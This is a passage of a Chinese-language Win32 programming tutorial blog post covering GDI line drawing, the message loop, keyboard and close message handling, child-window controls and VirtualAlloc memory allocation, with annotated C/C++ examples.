class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HWND hWnd; <span class="comment">// 窗口句柄</span></span><br><span class="line">    HDC hDc;   <span class="comment">// 设备上下文对象</span></span><br><span class="line">    HPEN hPen; <span class="comment">// 画笔</span></span><br><span class="line">    <span class="comment">// 1. 设备对象，要绘画的位置</span></span><br><span class="line">    <span class="comment">// 设置为NULL则表示在桌面中绘画</span></span><br><span class="line">    hWnd = (HWND)<span class="number">0x000C058A</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 获取设备的上下文对象（DC）</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        语法格式：</span></span><br><span class="line"><span class="comment">        HDC GetDC(</span></span><br><span class="line"><span class="comment">            HWND hWnd   // handle to window</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    hDc = <span class="built_in">GetDC</span>(hWnd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 创建画笔，设置线条的属性</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        语法格式：</span></span><br><span class="line"><span class="comment">        HPEN CreatePen(</span></span><br><span class="line"><span class="comment">            int fnPenStyle,    // pen style</span></span><br><span class="line"><span class="comment">            int nWidth,        // pen width</span></span><br><span class="line"><span class="comment">            COLORREF crColor   // pen color</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    hPen = <span class="built_in">CreatePen</span>(PS_SOLID, <span class="number">5</span>, <span class="built_in">RGB</span>(<span class="number">0xFF</span>, <span class="number">00</span>, <span class="number">00</span>)); <span class="comment">// RGB表示红绿蓝，红绿蓝的组合就可以组成新的一种颜色。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 关联</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        语法格式：</span></span><br><span class="line"><span class="comment">        HGDIOBJ SelectObject(</span></span><br><span class="line"><span class="comment">            HDC hdc,          // handle to DC</span></span><br><span class="line"><span class="comment">            HGDIOBJ hgdiobj   // handle to object</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">SelectObject</span>(hDc, hPen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 开始画线</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        语法格式：</span></span><br><span class="line"><span class="comment">        BOOL LineTo(</span></span><br><span class="line"><span class="comment">            HDC hdc,    // device context handle</span></span><br><span class="line"><span class="comment">            int nXEnd,  // x-coordinate of ending point</span></span><br><span class="line"><span class="comment">            int nYEnd   // y-coordinate of ending point</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">LineTo</span>(hDc, <span class="number">400</span>, <span class="number">400</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 释放资源</span></span><br><span class="line">    <span class="built_in">DeleteObject</span>(hPen);</span><br><span class="line">    <span class="built_in">ReleaseDC</span>(hWnd, hDc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h1><p>消息：当我们点击鼠标的时候，或者当我们按下键盘的时候，操作系统都要把这些动作记录下来，存储到一个结构体中，这个<strong>结构体</strong>就是消息。</p><p>消息队列：<strong>每个线程</strong>只有一个消息队列。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404145930395.png" alt="image-20220404145930395"></p><h1 id="第一个Windows程序"><a href="#第一个Windows程序" class="headerlink" title="第一个Windows程序"></a>第一个Windows程序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HINSTANCE hInstance,      <span class="comment">// handle to current instance,指向模块的句柄，实际上这个值就是模块在进程空间内的内存地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">  HINSTANCE hPrevInstance,  <span class="comment">// handle to previous instance,该参数永远为空NULL，无需理解</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSTR lpCmdLine,          <span class="comment">// command line</span></span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">int</span> nCmdShow              <span class="comment">// show state</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="调试信息输出"><a href="#调试信息输出" class="headerlink" title="调试信息输出"></a>调试信息输出</h2><p>不使用printf，使用OutputDebugString</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void OutputDebugString(</span><br><span class="line">  LPCTSTR lpOutputString</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404151609675.png" alt="image-20220404151609675"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 窗口函数定义</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 必须要调用一个默认的消息处理函数，关闭、最小化、最大化都是由默认消息处理函数处理的</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 定义创建的窗口(创建注册窗口类)</span></span><br><span class="line">    TCHAR className[] = <span class="built_in">TEXT</span>(<span class="string">&quot;My First Window&quot;</span>);</span><br><span class="line">    WNDCLASS wndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// 设置窗口背景色</span></span><br><span class="line">    wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;</span><br><span class="line">    <span class="comment">// 设置类名字</span></span><br><span class="line">    wndClass.lpszClassName = className;</span><br><span class="line">    <span class="comment">// 设置模块地址</span></span><br><span class="line">    wndClass.hInstance = hInstance;</span><br><span class="line">    <span class="comment">// 处理消息的窗口函数</span></span><br><span class="line">    wndClass.lpfnWndProc = WindowProc; <span class="comment">// 不是调用函数，只是告诉操作系统，当前窗口对应的窗口回调函数是什么</span></span><br><span class="line">    <span class="comment">// 注册窗口类</span></span><br><span class="line">    <span class="built_in">RegisterClass</span>(&amp;wndClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 创建并显示窗口</span></span><br><span class="line">    <span class="comment">// 创建窗口</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    CreateWindow 语法格式：</span></span><br><span class="line"><span class="comment">    HWND CreateWindow(</span></span><br><span class="line"><span class="comment">        LPCTSTR lpClassName,  // registered class name 类名字</span></span><br><span class="line"><span class="comment">        LPCTSTR lpWindowName, // window name 窗口名字</span></span><br><span class="line"><span class="comment">        DWORD dwStyle,        // window style 窗口外观的样式</span></span><br><span class="line"><span class="comment">        int x,                // horizontal position of window 相对于父窗口x坐标</span></span><br><span class="line"><span class="comment">        int y,                // vertical position of window 相对于父窗口y坐标</span></span><br><span class="line"><span class="comment">        int nWidth,           // window width 窗口宽度：像素</span></span><br><span class="line"><span class="comment">        int nHeight,          // window height 窗口长度：像素</span></span><br><span class="line"><span class="comment">        HWND hWndParent,      // handle to parent or owner window 父窗口句柄</span></span><br><span class="line"><span class="comment">        HMENU hMenu,          // menu handle or child identifier 菜单句柄</span></span><br><span class="line"><span class="comment">        HINSTANCE hInstance,  // handle to application instance 模块</span></span><br><span class="line"><span class="comment">        LPVOID lpParam        // window-creation data  附加数据</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    HWND hWnd = <span class="built_in">CreateWindow</span>(className, <span class="built_in">TEXT</span>(<span class="string">&quot;窗口&quot;</span>), WS_OVERLAPPEDWINDOW, <span class="number">10</span>, <span class="number">10</span>, <span class="number">600</span>, <span class="number">300</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hWnd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果为NULL则窗口创建失败，输出错误信息</span></span><br><span class="line">        <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">OutputDebugString</span>((LPCWSTR)szOutBuff);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示窗口</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ShowWindow 语法格式：</span></span><br><span class="line"><span class="comment">    BOOL ShowWindow(</span></span><br><span class="line"><span class="comment">        HWND hWnd,     // handle to window 窗口句柄</span></span><br><span class="line"><span class="comment">        int nCmdShow   // show state 显示的形式</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">ShowWindow</span>(hWnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 接收消息并处理</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    GetMessage 语法格式：</span></span><br><span class="line"><span class="comment">    BOOL GetMessage(</span></span><br><span class="line"><span class="comment">        LPMSG lpMsg,         // message information OUT类型参数，这是一个指针</span></span><br><span class="line"><span class="comment">        // 后三个参数都是过滤条件</span></span><br><span class="line"><span class="comment">        HWND hWnd,           // handle to window 窗口句柄，如果为NULL则表示该线程中的所有消息都要</span></span><br><span class="line"><span class="comment">        UINT wMsgFilterMin,  // first message 第一条信息</span></span><br><span class="line"><span class="comment">        UINT wMsgFilterMax   // last message 最后一条信息</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    MSG msg;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    <span class="keyword">while</span> ((bRet = <span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (bRet == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// handle the error and possibly exit</span></span><br><span class="line">            <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">            <span class="built_in">OutputDebugString</span>((LPCWSTR)szOutBuff);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 转换消息</span></span><br><span class="line">            <span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line">            <span class="comment">// 分发消息：就是给系统调用窗口处理函数</span></span><br><span class="line">            <span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404153213749.png" alt="image-20220404153213749"></p><h1 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h1><p>callback的几个参数，都是之前msg的部分参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> </span></span><br></pre></td></tr></table></figure><h2 id="处理窗口关闭"><a href="#处理窗口关闭" class="headerlink" title="处理窗口关闭"></a>处理窗口关闭</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="处理键盘按下"><a href="#处理键盘按下" class="headerlink" title="处理键盘按下"></a>处理键盘按下</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//MessageBox(0, 0, 0, 0)</span></span><br><span class="line">        <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;keyboard: %x - %x \n&quot;</span>,uMsg, wParam);</span><br><span class="line">        <span class="built_in">OutputDebugString</span>((LPCTSTR)szOutBuff);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"><span class="keyword">case</span> WM_CHAR:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;字符: %c \n&quot;</span>, wParam);</span><br><span class="line">        <span class="built_in">OutputDebugString</span>((LPCTSTR)szOutBuff);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所有的消息直接去查就行了，</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404162017477.png" alt="image-20220404162017477"></p><h1 id="子窗口"><a href="#子窗口" class="headerlink" title="子窗口"></a>子窗口</h1><h2 id="子窗口控件"><a href="#子窗口控件" class="headerlink" title="子窗口控件"></a>子窗口控件</h2><ol><li> Windows提供了几个预定义的窗口类以方便我们的使用，我们一般叫它们为子窗口控件，简称控件；</li><li> 控件会自己处理消息，并在自己状态发生改变时通知父窗口；</li><li> 预定义的控件有：按钮、复选框、编辑框、静态字符串标签和滚动条等。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CWA_EDIT 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CWA_BUTTON_0 0x101</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CWA_BUTTON_1 0x102</span></span><br><span class="line"><span class="comment">// gHinstance = hInstance; 全局</span></span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//编辑框</span></span><br><span class="line">        <span class="built_in">CreateWindow</span>(</span><br><span class="line">            <span class="string">&quot;EDIT&quot;</span>,                                            <span class="comment">// registered class name 注册的类名，使用EDIT则为编辑框</span></span><br><span class="line">            <span class="string">&quot;&quot;</span>,                                                <span class="comment">// window name 窗口名称</span></span><br><span class="line">            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE, <span class="comment">// window style 子窗口控件样式：子窗口、创建后可以看到、滚动条、自动换行</span></span><br><span class="line">            <span class="number">0</span>,                                                 <span class="comment">// horizontal position of window 在父窗口上的x坐标</span></span><br><span class="line">            <span class="number">0</span>,                                                 <span class="comment">// vertical position of window 在父窗口上的y坐标</span></span><br><span class="line">            <span class="number">400</span>,                                               <span class="comment">// window width 控件宽度</span></span><br><span class="line">            <span class="number">300</span>,                                               <span class="comment">// window height 控件高度</span></span><br><span class="line">            hwnd,                                              <span class="comment">// menu handle or child identifier 父窗口句柄</span></span><br><span class="line">            (HWND)CWA_EDIT,                                    <span class="comment">// menu handle or child identifier 子窗口标识</span></span><br><span class="line">            gHinstance,                                        <span class="comment">// handle to application instance 模块</span></span><br><span class="line">            <span class="literal">NULL</span>                                               <span class="comment">// window-creation data 附加数据</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 创建&quot;设置&quot;按钮</span></span><br><span class="line">        <span class="built_in">CreateWindow</span>(</span><br><span class="line">            <span class="built_in">TEXT</span>(<span class="string">&quot;BUTTON&quot;</span>),        <span class="comment">// registered class name 注册的类名，使用BUTTON则为按钮</span></span><br><span class="line">            <span class="built_in">TEXT</span>(<span class="string">&quot;设置&quot;</span>),          <span class="comment">// window name 按钮名称</span></span><br><span class="line">            WS_CHILD | WS_VISIBLE, <span class="comment">// window style 子窗口控件样式：子窗口、创建后可以看到</span></span><br><span class="line">            <span class="number">450</span>,                   <span class="comment">// horizontal position of window 在父窗口上的x坐标</span></span><br><span class="line">            <span class="number">150</span>,                   <span class="comment">// vertical position of window 在父窗口上的y坐标</span></span><br><span class="line">            <span class="number">80</span>,                    <span class="comment">// window width 控件宽度</span></span><br><span class="line">            <span class="number">20</span>,                    <span class="comment">// window height 控件高度</span></span><br><span class="line">            hwnd,                  <span class="comment">// menu handle or child identifier 父窗口句柄</span></span><br><span class="line">            (HWND)CWA_BUTTON_0,    <span class="comment">// menu handle or child identifier 子窗口标识</span></span><br><span class="line">            gHinstance,            <span class="comment">// handle to application instance 模块</span></span><br><span class="line">            <span class="literal">NULL</span>                   <span class="comment">// window-creation data 附加数据</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建&quot;获取&quot;按钮</span></span><br><span class="line">        <span class="built_in">CreateWindow</span>(</span><br><span class="line">            <span class="built_in">TEXT</span>(<span class="string">&quot;BUTTON&quot;</span>),        <span class="comment">// registered class name 注册的类名，使用BUTTON则为按钮</span></span><br><span class="line">            <span class="built_in">TEXT</span>(<span class="string">&quot;获取&quot;</span>),          <span class="comment">// window name 按钮名称</span></span><br><span class="line">            WS_CHILD | WS_VISIBLE, <span class="comment">// window style 子窗口控件样式：子窗口、创建后可以看到</span></span><br><span class="line">            <span class="number">450</span>,                   <span class="comment">// horizontal position of window 在父窗口上的x坐标</span></span><br><span class="line">            <span class="number">100</span>,                   <span class="comment">// vertical position of window 在父窗口上的y坐标</span></span><br><span class="line">            <span class="number">80</span>,                    <span class="comment">// window width 控件宽度</span></span><br><span class="line">            <span class="number">20</span>,                    <span class="comment">// window height 控件高度</span></span><br><span class="line">            hwnd,                  <span class="comment">// menu handle or child identifier 父窗口句柄</span></span><br><span class="line">            (HWND)CWA_BUTTON_1,    <span class="comment">// menu handle or child identifier 子窗口标识</span></span><br><span class="line">            gHinstance,            <span class="comment">// handle to application instance 模块</span></span><br><span class="line">            <span class="literal">NULL</span>                   <span class="comment">// window-creation data 附加数据</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当按钮点击则处理</span></span><br><span class="line">    <span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 宏WM_COMMAND中，wParam参数的低16位中有标识，根据标识我们才能判断哪个按钮和编辑框，使用LOWORD()可以获取低16位</span></span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (<span class="built_in">LOWORD</span>(wParam))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 当按钮为设置</span></span><br><span class="line">        <span class="keyword">case</span> CWA_BUTTON_0:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// SetDlgItemText函数修改编辑框内容</span></span><br><span class="line">            <span class="built_in">SetDlgItemText</span>(hwnd, (<span class="keyword">int</span>)CWA_EDIT, <span class="built_in">TEXT</span>(<span class="string">&quot;HACK THE WORLD&quot;</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当按钮为获取</span></span><br><span class="line">        <span class="keyword">case</span> CWA_BUTTON_1:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// MessageBox弹框输出编辑框内容</span></span><br><span class="line">            TCHAR szEditBuffer[<span class="number">0x80</span>];</span><br><span class="line">            <span class="built_in">GetDlgItemText</span>(hwnd, (<span class="keyword">int</span>)CWA_EDIT, szEditBuffer, <span class="number">0x80</span>);</span><br><span class="line">            <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, szEditBuffer, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="虚拟内存与物理内存"><a href="#虚拟内存与物理内存" class="headerlink" title="虚拟内存与物理内存"></a>虚拟内存与物理内存</h1><h2 id="可使用的物理内存"><a href="#可使用的物理内存" class="headerlink" title="可使用的物理内存"></a>可使用的物理内存</h2><p>MmNumberOfPhysicalPages*4 = 物理内存</p><p>虚拟内存（硬盘）</p><h2 id="可识别的物理内存"><a href="#可识别的物理内存" class="headerlink" title="可识别的物理内存"></a>可识别的物理内存</h2><p><strong>32位操作系统最多可以识别物理内存为64G</strong>，但是操作系统会进行限制，<strong>例如XP这个系统只能识别4G的物理内存</strong>（Windows Server 2003服务器版本可以识别4G以上）。</p><p>但是我们可以通过HOOK系统函数来突破XP操作系统的4GB限制</p><h1 id="私有内存的申请释放"><a href="#私有内存的申请释放" class="headerlink" title="私有内存的申请释放"></a>私有内存的申请释放</h1><p>物理内存分为两类，一个是私有内存（Private）一个是共享内存（Mapped），私有内存的意思是这块物理内存（物理页）只有你使用，而共享内存则是多个进程一起用。</p><p>申请内存的方式：</p><ol><li> 通过virtualAllocate/virtualAllocEx申请的：私有</li><li> 通过CreateFileMapping映射的：共享</li></ol><h2 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpAddress,        <span class="comment">// region to reserve or commit 要分配的内存区域的地址，没有特殊需求通常不指定</span></span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwSize,           <span class="comment">// size of region 分配的大小，一个物理页大小是0x1000（4KB），看你需要申请多少个物理页就乘以多少</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flAllocationType,  <span class="comment">// type of allocation 分配的类型，常用的是MEM_COMMIT（占用线性地址，也需要物理内存）和MEM_RESERVE（占用线性地址，但不需要物理内存）</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flProtect          <span class="comment">// type of access protection 该内存的初始保护属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>占用线性地址并分配物理内存，可读可写：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 